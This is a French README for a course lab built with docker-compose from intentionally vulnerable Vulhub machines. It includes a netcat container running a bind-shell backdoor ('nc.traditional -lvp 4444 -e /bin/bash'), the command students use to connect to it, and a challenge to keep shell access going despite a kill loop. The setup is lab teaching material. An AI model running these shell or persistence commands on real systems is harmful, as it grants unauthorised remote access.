# Infrastructure pour le labo 1

Ce répertoire contient le `docker-compose.yaml` pour faire l'infrastructure tu
labo 1.
Vous pouvez lancer l'infrastructure vous-même avec la commande suivante:

```
docker-compose up -d
```

La première fois ça prend pas mal de temps vu que docker doit télécharger les fichiers.
La plupart des machines viennent du projet [Linux Vulhub](https://github.com/vulhub/vulhub) et présentent une ou plusieurs vulnérabilités.
Les machines suivantes ont été ajoutées manuellement:

- wireguard - qui permet une connexion sécurisée depuis l'extérieur
- netcat - avec une backdoor pré-installé
- huge - qui contient plusieurs services

## Connection

Afin de vous connecter au système, vous pouvez utiliser:

```
docker exec -ti wireguard
```

Ce qui vous donne le même accès comme vous avez eu au cours avec Wireguard.

## Netcat backdoor

Le docker `netcat` à l'adresse `10.1.1.3` contient un backdoor très simple qui est démarré comme suite:

```
nc.traditional -lvp 4444 -e /bin/bash
```

Ceci lance la commande `netcat` en écoutant sur le port `4444` et en connectant les entrées et sorties avec la commande `/bin/bash`.
Pour éviter qu'un·e étudiant·e bloque les autres en se connectant sur ce port, il y a une boule infinie, plus une deuxième boucle qui arrète `netcat` tous les 10 secondes.
Vous trouverez la commande complète dans le [Dockerfilen.nc](Dockerfile.nc).

Pour accéder à ce backdoor, vous pouvez lancer

```
nc 10.1.1.3 4444
```

Et vous avez jusqu'à 10 secondes pour explorer le système et trouver le `password.txt`.
Si vous voulez avoir plus de temps, vous pouvez aussi lancer vous-même un backdoor supplémentaire sur la machine 10.1.1.3:

```
nc.traditional -lvp 5555 -e /bin/bash &
```

Bon - ceci ne marche pas, parce que le `Dockerfile.nc` contient une ligne qui termine tous les processus qui contiennent la chaîne `bash`.
A vous de trouver un meilleur moyen - sans changer le `Dockerfile.nc`!